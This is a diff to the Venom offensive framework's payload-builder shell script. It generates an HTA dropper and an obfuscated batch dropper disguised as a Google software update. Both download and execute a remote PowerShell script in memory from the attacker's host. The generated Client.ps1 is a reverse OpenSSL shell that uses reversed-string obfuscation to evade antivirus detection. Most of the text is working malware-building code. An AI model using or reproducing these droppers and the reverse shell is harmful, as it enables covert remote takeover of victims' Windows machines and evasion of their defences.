@@ -12338,7 +12338,7 @@ cat << !
     DESCRIPTION        : Reverse OpenSSL Powershell Shell
     TARGET SYSTEMS     : Windows (8|8.1|10)
     LOLBin             : WinHttpRequest (FileLess)
-    DROPPER EXTENSION  : BAT
+    DROPPER EXTENSION  : BAT|HTA
     AGENT EXTENSION    : PS1
     AGENT PERSISTENCE  : NOT AVAILABLE
 
@@ -12484,9 +12484,8 @@ cat << !
     AGENT Nº   : 7
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse TCP Powershell Shell (OpenSSL - FileLess)
-    OBFUSCATION: If activated, dropper.bat will be obfuscated to evade
-                 Anti-Virus detection and have is extension spoofed to
-                 Dropper.crdownload.bat [2º extension hidden under M$]
+    OBFUSCATION: If activated, dropper.hta html file will be created
+                 insted of the obfuscated Batch dropper.bat (default)
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
@@ -13673,8 +13672,7 @@ if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$CN" ]; then CN="SSARedTeam.com";fi
 if [ -z "$Drop" ]; then Drop="Update-playGoogle";fi
-if [ "$easter_egg" = "OFF" ]; then Ext="bat";else Ext="bat";fi
-#Ext="crdownload.bat
+if [ "$easter_egg" = "OFF" ]; then Ext="bat";else Ext="hta";fi
 
 ## Display final settings to user.
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};sleep 1
@@ -13698,6 +13696,14 @@ echo "${BlueF}[☠]${white} Building Batch script dropper ..${white}";sleep 2
 ## Extract Dropper FullName
 FullName=$(echo "$Drop.$Ext"|cut -d '.' -f1|cut -d '-' -f2)
 if [ "$easter_egg" = "ON" ]; then
+   echo "Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
+   echo "Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
+   echo "<script>" >> $IPATH/output/$Drop.$Ext
+   echo "a=new ActiveXObject(\"WScript.Shell\");" >> $IPATH/output/$Drop.$Ext
+   echo "a.run(\"powershell -w 1 \$MyCat=New-Object -Com WinHttp.WinHttpRequest.5.1;\$MyCat.open('GET','http://$lhost/Client.ps1',\$false);\$MyCat.send();iex \$MyCat.responseText;\", 0);window.close();" >> $IPATH/output/$Drop.$Ext
+   echo "</script>" >> $IPATH/output/$Drop.$Ext
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper.hta html file written to output.";sleep 1
+else
    echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
    echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
    echo "@echo off&%@i%&ti%@_$%tl^e p%_?%l%@#%ay.go%@i%og%'$%le.co%_[-1]%m - %_$%Up%@$%dat%@Q%in%_$%g S%@$%of%@i%twa%U1%re %_$%Rep%@%osi%@%tor%@%ie%('$')%s." >> $IPATH/output/$Drop.$Ext
@@ -13706,17 +13712,6 @@ if [ "$easter_egg" = "ON" ]; then
    echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll -w 1 \$My%@$%C\"a\"t=nE%@i%W-Obj%@%eC%('i')%t -Co%@i%m Win\"H\"tt%@$%p.Wi^nH\"t\"tpReq%@i_%ue\"s\"t.5.1;\$MyC%@$%at.op%@f%en('G%@i%ET','ht%@D%t%[-1]%p://$lhost/Client.ps%@[0]%1',\$fal%LeD%se);\$My\"C\"at.se%@$%nd();iex \$My%@1b%Cat.r\"e\"s%@0$%po%'$%ns%@?%e\"T\"e%@_i%xt;" >> $IPATH/output/$Drop.$Ext
    echo "=Exit" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Obfuscated Batch Dropper written to output.";sleep 1
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} Spoofing Batch Dropper Extension ([${GreenF}OK${white}])${white}";sleep 2
-else
-   echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $IPATH/output/$Drop.$Ext
-   echo ":: Framework: Venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.$Ext
-   echo ":: Function: This template its used to download the Client.ps1 from attacker" >> $IPATH/output/$Drop.$Ext
-   echo ":: machine (LAN) and execute it on target RAM (FileLess - Agent does not touch disk)" >> $IPATH/output/$Drop.$Ext
-   echo "@echo off&&title play.google.com - Updating Software Repositories." >> $IPATH/output/$Drop.$Ext
-   echo "if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit" >> $IPATH/output/$Drop.$Ext
-   echo "powershell (NeW-Object -ComObject Wscript.Shell).Popup(\"\"\"$FullName software updated..\"\"\",4,\"\"\"$FullName - 3.10.5-dev Windows Installer\"\"\",0+64)" >> $IPATH/output/$Drop.$Ext
-   echo "powershell -w 1 \$MyCat=New-Object -Com WinHttp.WinHttpRequest.5.1;\$MyCat.open('GET','http://$lhost/Client.ps1',\$false);\$MyCat.send();iex \$MyCat.responseText;" >> $IPATH/output/$Drop.$Ext
-   echo "Exit" >> $IPATH/output/$Drop.$Ext
 fi
 
 
@@ -13728,10 +13723,10 @@ echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/Client.ps1
 echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/Client.ps1
 echo "#>" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "\$Buff = \"tneilCpcT.stekcoS.teN\";\$Cac = \$Buff.ToCharArray();[Array]::Reverse(\$Cac);" >> $IPATH/output/Client.ps1
-echo "\$NewObjectCommand = (\$Cac -Join '');\$Micro = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Micro.ToCharArray();" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Seconds 1" >> $IPATH/output/Client.ps1
+echo "\$Waudt = \"tneilCpcT.stekcoS.teN\";\$Bin = \$Waudt.ToCharArray();[Array]::Reverse(\$Bin);" >> $IPATH/output/Client.ps1
+echo "\$NewObjectCommand = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/Client.ps1
 echo "[Array]::Reverse(\$CharArray);\$PSArgException = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
-echo "" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
 echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/Client.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
@@ -13742,7 +13737,7 @@ echo "        \$writer.Write((pwd).Path + '> ')" >> $IPATH/output/Client.ps1
 echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Seconds 1" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
 echo "   \$data = (New-Object -TypeName \$PSArgException).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
